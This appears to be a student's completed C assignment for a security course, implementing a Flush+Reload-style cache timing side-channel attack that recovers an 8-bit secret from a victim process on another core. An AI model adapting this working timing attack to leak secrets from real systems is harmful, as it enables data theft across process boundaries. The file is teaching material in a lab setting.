/*
 *  Edit this file to complete part 2. Your x500 should be located in the data.txt file
 *  Your x500 is used to calibrate the victim's secret. After you complete your attacker
 *  function, the victim's secret should be located in the result array. Please report
 *  what you found the victim's secret to be in your results.txt file.
 */
// James Sargsyan; sargs005


#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include "cacheutils.h"

#define THRESHOLD 150 //FILL IN FROM PART 1

/*
 *  Cache side channel attack code.
 */
void attacker(){
    unsigned result[8] = {2, 2, 2, 2, 2, 2, 2, 2}; //this is our victims secret, fill with either 0's or 1's

    // init flush
    flush(addr); 
    
    *shmem_ptr = 1; //send initial signal
    
    for(int i = 0; i < 8; i++){
        // receive victim message for complete 1 iteration
        while(*shmem_ptr == 1) sched_yield(); 
        
        /** TODO: TIME ATTACK **/
        size_t time = rdtsc();
        maccess(addr); // attacker measures access time
        size_t delta = rdtsc() - time;
        flush(addr);

        //printf("%lu\t", delta);

        if(delta < THRESHOLD){
            result[i] = 0; //cache hit
        }else{
            result[i] = 1; // cache miss
        }
        *shmem_ptr = 1; //send next signal

    }


    printf("Result:\t");
    for (int i = 0; i < 8; i++) { printf("%u\t", result[i]); }
    putchar('\n');
}

/*
 *  Main sets up our different cores and our shared memory.
 *  There is nothing for you to change here, but if you're
 *  curious about the setup process here it is. 
 */
int main(){

    init();
    create_shared_memory();

    cpu_set_t cpu_mask;
    CPU_ZERO(&cpu_mask);
    
    pid_t child = fork();
    if (child == 0){
        // victim code
        CPU_SET(3, &cpu_mask); // core 3. 
        sched_setaffinity(0, sizeof(cpu_set_t), &cpu_mask); 
        
        victim();
        
        return 0; 
    }
    
    // attacker code
    CPU_SET(1, &cpu_mask); // core 1. 
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu_mask);

    attacker();

    return 0;
}
